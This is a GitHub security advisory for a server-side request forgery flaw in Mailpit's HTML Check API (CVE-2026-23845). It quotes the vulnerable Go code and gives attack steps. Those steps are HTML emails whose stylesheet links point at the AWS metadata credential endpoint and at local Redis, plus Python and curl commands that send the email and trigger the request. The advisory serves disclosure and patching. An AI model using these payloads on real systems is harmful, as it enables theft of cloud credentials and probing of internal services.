# [M] Mailpit has a Server-Side Request Forgery (SSRF) via HTML Check API

## Summary
Severity: Medium
Advisory: GHSA-6jxm-fv7w-rw5j
CVE: CVE-2026-23845
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-6jxm-fv7w-rw5j
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=0 <1.28.3

## Details
### Server-Side Request Forgery (SSRF) via HTML Check CSS Download

The HTML Check feature (`/api/v1/message/{ID}/html-check`) is designed to analyze HTML emails for compatibility. During this process, the `inlineRemoteCSS()` function automatically downloads CSS files from external `<link rel="stylesheet" href="...">` tags to inline them for testing. 


#### Affected Components

- **Primary File:** `internal/htmlcheck/css.go` (lines 132-207)
- **API Endpoint:** `/api/v1/message/{ID}/html-check`
- **Handler:** `server/apiv1/other.go` (lines 38-75)
- **Vulnerable Functions:**
  - `inlineRemoteCSS()` - line 132
  - `downloadToBytes()` - line 193
  - `isURL()` - line 221

#### Technical Details

**1. Insufficient URL Validation (`isURL()` function):**

```go
// internal/htmlcheck/css.go:221-224
func isURL(str string) bool {
    u, err := url.Parse(str)
    return err == nil && (u.Scheme == "http" || u.Scheme == "https") && u.Host != ""
}
```


**2. Unrestricted Download (`downloadToBytes()` function):**

```go
// internal/htmlcheck/css.go:193-207
func downloadToBytes(url string) ([]byte, error) {
    client := http.Client{
        Timeout: 5 * time.Second,
    }

    // Get the link response data
    resp, err := client.Get(url)  // ⚠️ VULNERABLE - No IP validation
    if err != nil {
        return nil, err
    }
    defer func() { _ = resp.Body.Close() }()

    if resp.StatusCode != 200 {
        err := fmt.Errorf("error downloading %s", url)
        return nil, err
    }

    body, err := io.ReadAll(resp.Body)  // ⚠️ Downloads ENTIRE response
    if err != nil {
        return nil, err
    }

    return body, nil
}
```

**3. Automatic CSS Processing:**

```go
// internal/htmlcheck/css.go:132-187
func inlineRemoteCSS(h string) (string, error) {
    reader := strings.NewReader(h)
    doc, err := goquery.NewDocumentFromReader(reader)
    if err != nil {
        return h, err
    }

    remoteCSS := doc.Find("link[rel=\"stylesheet\"]").Nodes
    for _, link := range remoteCSS {
        attributes := link.Attr
        for _, a := range attributes {
            if a.Key == "href" {
                if !isURL(a.Val) {  // ⚠️ Insufficient validation
                    continue
                }

                if config.BlockRemoteCSSAndFonts {
                    logger.Log().Debugf("[html-check] skip testing remote CSS content: %s (--block-remote-css-and-fonts)", a.Val)
                    return h, nil
                }

                resp, err := downloadToBytes(a.Val)  // ⚠️ Downloads from ANY URL
                if err != nil {
                    logger.Log().Warnf("[html-check] failed to download %s", a.Val)
                    continue
                }

                // Inlines the downloaded CSS
                styleBlock := &html.Node{
                    Type:     html.ElementNode,
                    Data:     "style",
                    DataAtom: atom.Style,
                }
                styleBlock.AppendChild(&html.Node{
                    Type: html.TextNode,
                    Data: string(resp),  // Downloaded content inserted
                })
                link.Parent.AppendChild(styleBlock)
            }
        }
    }
    
    return doc.Html()
}
```


#### Attack Vectors

**Attack Vector 1: Cloud Metadata Credential Theft**

Attacker sends HTML email with:
```html
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role">
</head>
<body>Legitimate email content</body>
</html>
```

When HTML check is triggered:
1. Mailpit makes GET request to AWS metadata endpoint
2. Downloads IAM credentials as "CSS content"
3. Credentials logged or potentially leaked via error messages



#### Proof of Concept

A complete working exploit is provided in `ssrf_htmlcheck_poc.py`.

**PoC Usage:**

```bash
# Ensure Mailpit is running
# SMTP: localhost:1025
# HTTP API: localhost:8025

# Run the exploit
python3 ssrf_htmlcheck_poc.py
```

**PoC Workflow:**

1. **Starts SSRF listener** on port 8888 to detect callbacks
2. **Sends malicious HTML emails** containing:
   ```html
   <link rel="stylesheet" href="http://localhost:8888/malicious.css">
   <link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
   <link rel="stylesheet" href="http://127.0.0.1:6379/">
   ```
3. **Triggers HTML check** via API: `GET /api/v1/message/{ID}/html-check`
4. **Monitors callbacks** and analyzes responses
5. **Demonstrates exploitation** of:
   - Local listener (proves SSRF)
   - Cloud metadata endpoints
   - Internal services (Redis, etc.)
   - Private network ranges

**Expected Output:**

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  Mailpit SSRF PoC - HTML Check CSS Download Vulnerability                   ║
║  Severity: MODERATE                                                              ║
║  File: internal/htmlcheck/css.go:193-207                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

[+] SSRF listener started on port 8888
[*] Testing SSRF with callback to local listener...

================================================================================
[*] Testing SSRF with target: http://localhost:8888/malicious.css
================================================================================
[+] Email sent with CSS link to: http://localhost:8888/malicious.css
[+] Message ID: abc123xyz
[*] Triggering HTML check: http://localhost:8025/api/v1/message/abc123xyz/html-check
[+] HTML check completed (Status: 200)

[SSRF-LISTENER] 127.0.0.1 - "GET /malicious.css HTTP/1.1" 200 -

[+] SUCCESS! SSRF confirmed - Received 1 callback(s):
    Path: /malicious.css
    User-Agent: Mailpit/dev

================================================================================
[*] Testing SSRF against internal/private targets...
================================================================================

⚠️  Note: These may timeout or fail, but Mailpit WILL attempt the connection

[+] Email sent with CSS link to: http://127.0.0.1:6379/
[+] Message ID: def456uvw
[*] Triggering HTML check: http://localhost:8025/api/v1/message/def456uvw/html-check
[!] Request timed out - target may be blocking or slow
```

**Manual Testing:**

```bash
# 1. Send malicious email
cat << 'EOF' | python3 - <<SENDMAIL
import smtplib
from email.mime.text import MIMEText

html = '''
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
</head>
<body>Test</body>
</html>
'''

msg = MIMEText(html, 'html')
msg['Subject'] = 'SSRF Test'
msg['From'] = 'test@test.com'
msg['To'] = 'victim@test.com'

with smtplib.SMTP('localhost', 1025) as smtp:
    smtp.send_message(msg)
SENDMAIL
EOF

# 2. Get message ID
MESSAGE_ID=$(curl -s http://localhost:8025/api/v1/messages?limit=1 | jq -r '.messages[0].ID')

# 3. Trigger SSRF
curl -v "http://localhost:8025/api/v1/message/$MESSAGE_ID/html-check"

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-6jxm-fv7w-rw5j
- https://nvd.nist.gov/vuln/detail/CVE-2026-23845
- https://github.com/axllent/mailpit/commit/1679a0aba592ebc8487a996d37fea8318c984dfe
- https://github.com/axllent/mailpit
- https://github.com/axllent/mailpit/releases/tag/v1.28.3
